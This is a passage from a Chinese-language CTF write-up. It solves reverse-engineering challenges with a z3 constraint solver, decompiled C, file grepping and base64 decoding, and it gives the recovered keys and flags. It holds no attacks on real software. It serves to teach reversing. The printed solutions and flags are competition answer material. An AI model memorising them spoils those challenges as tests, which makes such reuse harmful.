  0x95, 0xBB, 0xD3, 0x51, 0x39, 0xE7, 0xC9, 0xCE, 0x29, 0x72, 
  0x47, 0x6C, 0x70, 0x15, 0xDF, 0xD9, 0x17, 0x74, 0x3F, 0x62, 
  0xCD, 0x41, 0x07, 0x73, 0x53, 0x85, 0x31, 0x8A, 0x30, 0xAA, 
  0xAC, 0x2E, 0xA3, 0x50, 0x7A, 0xB5, 0x8E, 0x69, 0x1F, 0x6A, 
  0x97, 0x55, 0x3A, 0xB2, 0x59, 0xAB, 0xE0, 0x28, 0xC0, 0xB3, 
  0xBE, 0xCC, 0xC6, 0x2B, 0x5B, 0x92, 0xEE, 0x60, 0x20, 0x84, 
  0x4D, 0x0F, 0x26, 0x4A, 0x48, 0x0B, 0x36, 0x80, 0x5D, 0x6F, 
  0x4C, 0xB9, 0x81, 0x96, 0x32, 0xFD, 0x40, 0x8D, 0x27, 0xC1, 
  0x78, 0x4F, 0x79, 0xC8, 0x0E, 0x8C, 0xE5, 0x9E, 0xAE, 0xBF, 
  0xEF, 0x42, 0xC5, 0xAF, 0xA0, 0xC2, 0xFA, 0xC7, 0xB6, 0xDB, 
  0x18, 0xC4, 0xA6, 0xFE, 0xE9, 0xF5, 0x6E, 0x64, 0x2F, 0xF1, 
  0x1B, 0xFB, 0xBA, 0xA7, 0x37, 0x8F
]
tmp = []
for i in range(len(enc)):
	for j in range(len(table)):
		if table[j] == enc[i]:
			tmp.append(j)
print (tmp)

import z3
input = [z3.BitVec("p%d" % i,8) for i in range(40)]
v6 = [0]*8
v6[0] = 128;
v6[1] = 64;
v6[2] = 32;
v6[3] = 16;
v6[4] = 8;
v6[5] = 4;
v6[6] = 2;
v6[7] = 1;
s = z3.Solver()
for i in range(0,0x28,8):
    for  j in range(8):
        v5 = ((v6[j] & input[i + 3]) << (8 - (3 - j) %  8)) | ((v6[j] & input[i + 3]) >> ((3 - j) %  8)) | ((v6[j] & input[i + 2]) << (8 - (2 - j) %  8)) | ((v6[j] &  input[i + 2]) >> ((2 - j) %  8)) | ((v6[j] & input[i + 1]) << (8 - (1 - j) %  8)) | ((v6[j] &  input[i + 1]) >> ((1 - j) %  8)) | ((v6[j] & input[i]) << (8 - -j %  8)) | ((v6[j] &  input[i]) >> (-j %  8))
        v = ((v6[j] & input[i + 7]) << (8 - (7 - j) %  8)) | ((v6[j] & input[i + 7]) >> ((7 - j) %  8)) | ((v6[j] & input[i + 6]) << (8 - (6 - j) %  8)) | ((v6[j] &  input[i + 6]) >> ((6 - j) %  8)) | ((v6[j] & input[i + 5]) << (8 - (5 - j) %  8)) | ((v6[j] &  input[i + 5]) >> ((5 - j) %  8)) | ((v6[j] & input[i + 4]) << (8 - (4 - j) %  8)) | ((v6[j] &  input[i + 4]) >> ((4 - j) %  8))       
        s.add(v5 | v == tmp[i+j])
sat = s.check()
m = s.model()
flag = []
for i in range(len(m)):
	#print (input[i])
	flag.append(m[input[i]].as_long())
print (bytes(flag).decode())
'''
[0, 181, 122, 206, 37, 108, 7, 223, 0, 251, 124, 38, 75, 62, 134, 154, 0, 255, 37, 144, 255, 28, 56, 176, 0, 231, 60, 121, 225, 144, 251, 30, 0, 204, 179, 51, 78, 145, 65, 222, 29, 29, 29, 29]
Q5la5_3KChtem6_HYHk_NlHhNZz73aCZeK05II96
'''
```
## 总结
弄清题目加密逻辑，寻找最简单的解题方法，z3最擅长的就是方程式（表达式）的约束求解，加深了z3约束求解的使用。
## 出题思路
1. 逐字节对比，可用z3求解。
# Re -> 虚假的粉丝 (RE_MISC,Base64,seek)
## 题目分析
题目给的附件是一个mp3文件、exe、和一堆加密的文件，运行exe文件如下
```bash
So.... I heard you are AW's fans. So do I.
Yesterday I got a strange video. It might be one of AW's MV.
But I think something was hided in this MV. Can you find it for me?(Y/N)

Please give me your secret key(part1):44444
And key(part2):4444
And the final key:444
No No No! That key is wrong!
```
ida打开看逻辑：
```c
// bad sp value at call has been detected, the output may be wrong!
// positive sp value has been detected, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  v3 = alloca(sub_402390((char)&retaddr));
  sub_402150();
  strcpy(FileName, "./f/ASCII-faded ");
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v29 = '\x14\xC4';
  sub_401350("So.... I heard you are AW's fans. So do I.\n");
  sub_401350("Yesterday I got a strange video. It might be one of AW's MV.\n");
  sub_401350("But I think something was hided in this MV. Can you find it for me?(Y/N)\n");
  scanf("%c", &v13);
  if ( v13 == 'N' )
  {
    system("cls");
    sub_401350("You are not a real fans!\n");
    return 0;
  }
  if ( v13 == 89 )
  {
    system("cls");
    sub_401350("Get Ready!\nThe 'REAL' challenge has began!\n");
  }
  sub_401350("Please give me your secret key(part1):");
  v28 = 0;
  scanf("%d", &v12);                        <-------文件名>
  sub_401350("And key(part2):");
  scanf("%d", &Offset);                     <-------文件偏移>
  sub_401350("And the final key:");
  scanf("%d", &ElementSize);                <-------字符长度>
  FileName[16] = (char)v12 / -24 + 48;
  v15 = (char)(v12 / 100) % 10 + 48;
  v16 = (char)(v12 / 10) % 10 + 48;
  v17 = v12 % 10 + 48;
  v18 = 'txt.';
  Stream = fopen(FileName, "r");
  if ( !Stream )
  {
    sub_401350("No No No! That key is wrong!\n");
    fclose(Stream);
    return 0;
  }
  memset(Buffer, 0, sizeof(Buffer));
  fseek(Stream, Offset, 0);
  fread(Buffer, ElementSize, 1u, Stream);
  sub_401350("%s\n", Buffer);
  if ( Buffer[0] != 'U' || Buffer[39] != 'S' )        <-------读出的字符以'U'开头'S'结尾>
  {
    sub_401350("Sorry! Wrong Key.\n");
    fclose(Stream);
    return 0;
  }
  fflush(&iob[1]);
  fflush(&iob[1]);
  sub_401350("This key might be right, You have to try: ");
  scanf("%29s", v22);                                 <---------输入密钥'A'开头'R'结尾>
  if ( v22[0] == 'A' && v22[10] == 'R' )
  {
    sub_401350("Yes! that is the true key!\n");
    Sleep(0x7D0u);
    v28 = 1;
  }
  if ( v28 == 1 )
  {
    v29 = 5317;
    Stream = fopen("./f/ASCII-faded 5315.txt", "rb");  <----------打开5315文件>
    if ( !Stream )
    {
      sub_401350("ERROR!\n");
      return 0;
    }
    fread(v6, 0x4EDEu, 1u, Stream);
    fclose(Stream);
    v26 = 0;
    for ( i = 0; i <= 2126; ++i )
    {
      if ( v26 > 10 )
        v26 = 0;
      v6[i] ^= v22[v26++];                           <-----------亦或>
    }
    Stream = fopen("./f/ASCII-faded 5315.txt", "w");   <-----------再次写入文件>
    fwrite(v6, 0x84Fu, 1u, Stream);
    fclose(Stream);
  }
  dwCursorPosition.X = 0;
  dwCursorPosition.Y = 0;
  hConsoleOutput = GetStdHandle(0xFFFFFFF5);
  ConsoleCursorInfo.bVisible = 0;
  ConsoleCursorInfo.dwSize = 1;
  SetConsoleCursorInfo(hConsoleOutput, &ConsoleCursorInfo);
  v5 = (char *)calloc(0x100000u, 1u);
  setvbuf(&iob[1], v5, 0, 0x100000u);
  system("cls");
  system("pause");
  mciSendStringA("open ./faded.mp3", 0, 0, 0);
  mciSendStringA("play ./faded.mp3", 0, 0, 0);
  for ( j = 1; j < v29; ++j )
  {
    Sleep(0x1Eu);
    v23 = j;
    FileName[16] = (char)j / -24 + 48;
    v15 = (char)(j / 100) % 10 + 48;
    v16 = (char)(j / 10) % 10 + 48;
    v17 = j % 10 + 48;
    v18 = 1954051118;
    Stream = fopen(FileName, "r");
    fread(v21, 0x3264u, 1u, Stream);
    fflush(&iob[1]);
    sub_401350("%s", v21);
    SetConsoleCursorPosition(hConsoleOutput, dwCursorPosition);
    fclose(Stream);
  }
  Sleep(0x2710u);
  return 0;
}
```
这个题逻辑很清楚，类似与MISC的类型，从附件所给的文件中找出以U开头S结尾的文件名（key1），文件偏移（key2），字符长度（final key），之后输入真正的密钥（A开头R结尾）就可以解密5315文件,确定文件名和偏移
```bash
➜  f grep -E "U.{38}S" *.txt  
ASCII-faded 4157.txt:aaZ8088aaZ88B008BBBBB8888Z088Z8ZZZaX8@WBWW@W@W@W@W@WWWWBWBBB@@UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNSWMa  ............,.,.,.,,,,:
➜  f 
```
文件名4157,确定seek偏移，这里如果将文件读出来再确定字符串的偏移会和seek的偏移有一定出入，所以这里直接用字符匹配得到seek的偏移
```python
with open('ASCII-faded 4157.txt','r',encoding='utf-8') as f:
	#content = f.read()
	flag = True
	i = 0
	while(flag):		
		f.seek(i)
		content = f.read(40)
		# print (content)
		if content == 'UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNS':
			flag = False
			print ('offest:',i)
		i+=1
import urllib.parse
import base64
dec = base64.b64decode('UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNS')
print(urllib.parse.unquote(str(dec,'utf-8')))

# offest: 1118
# S3Cre7_K3y = Al4N_wAlK3R


```
得到seek偏移为1118，长度为40，输入程序解密5315文件：
```bash
So.... I heard you are AW's fans. So do I.
Yesterday I got a strange video. It might be one of AW's MV.
But I think something was hided in this MV. Can you find it for me?(Y/N)

Please give me your secret key(part1):4157
And key(part2):1118
And the final key:40
UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNS
This key might be right, You have to try: Al4N_wAlK3R
Yes! that is the true key!
```
找到解密后的文件：
```bash
➜  f cat ASCII-faded\ 5315.txt 
i;i;i;iririririri;iririri;i;;riririri;i;iriririr;;iriri;iririri;iri;iririririririri;i;iri;i;iri;irir;ri;iriri
iiriiiii;;riri;ii:i:i:ii;i;iiiii;iiiii;i;;riri;i;i;iri;iii;i;iii;iiiii;iiiii;iri;iiii:ii;iiiii;;rir;ririri;i;
:ii:,::iiriririi::.,.,,::ii;:::::i::::iiiiiii;irir;;i;::,::i:::::i::,::i:::iir;rii::ir:ii::::ii;i;i;i;i;iiii:
::::@B@,iiririi:@B@B@B@B::i::2@B:::B@q::i:::ii;iririi::B@Bi::B@B:,:@@U:,BBM:iirii,PB@B;::.@B5:i:i:i:iii:i::::
::,@B@BY:iiri;i:B@B@B@B@::.L:@B@.:,@B@.:,7jr,:i;iri;i:L@B@B.,G@@,.B@B@..B@F:irii:;B@B7,:.@B@B,:r:,Lv,:::,ju7,
:,F@@:@B.:iirir::..B@ ..@B@BkS@B.:.B@B.7@@@@@i:i;i;i:.@@,B@u..@BE @@@B:r@B,:ri;iiB@B@B.:@B@BG.iB@B@B@7.B@B@B:
,,@@BUB@B::;iriii:i@Bi.i@@Oi.BB@.,.@B@ @B@B@B@:ii;ii,@B@j@B@..X@B0B1v@@@B2:iirii:,B@2.E@@;B@@i:@@v @@@ @@@O7.
.B@@@B@@@r:iri;ii:7B@i:i@B.,:2@B5iuB@2.B@B80@U:irii:LB@B@B@B@..B@B@..B@@@.:i;i;ii.@B5.@B@@@@@B,B@..B@B.:uB@BU
7@B;...@B@:i:iiiiir@Br:;B@ii::B@B@B@B,,UB@B@B::iii::B@B...v@B7,BB@B,,@B@0::iiiii::B@F:,,..B@G.i@@:.@B@.@B@B@i
:i:::::::i::::::ii:ii:i:i::ii::,;7;,::i:,iL7::::::::;:::::::ri::::::i:::::i::,::::i:::i:i::::::ii:::::::LL:,,
::iii;ii::B@B@B@:iiiiiiiiiiri;ii:i:iiiiiii::::B@B@@@:iiiiiii:iii:iiiiiiiiir@B@B@Mi:iiiiri;iiiiiiiiiiiiii:i:i:
ii;iririi:rrr;rriiririri;iririri;i;iri;iri;iii7rrrrriiriririri;i;i;i;iri;iirr;rrriiiri;iriri;i;iriri;iriiiiii
i;i;iriri;ii:i:ii;ir;ririri;i;iririri;i;;r;ri;ii:i:iiriririririri;iri;;ririi:i:ii;iri;iriririririririririr;;i
```
拿到flag为`A_TrUe_AW_f4ns`
## 总结
题目不难，就是比较MISC。
# 附件
[附件](https://github.com/1094093288/IMG/tree/master/Pwn/xihulunjian)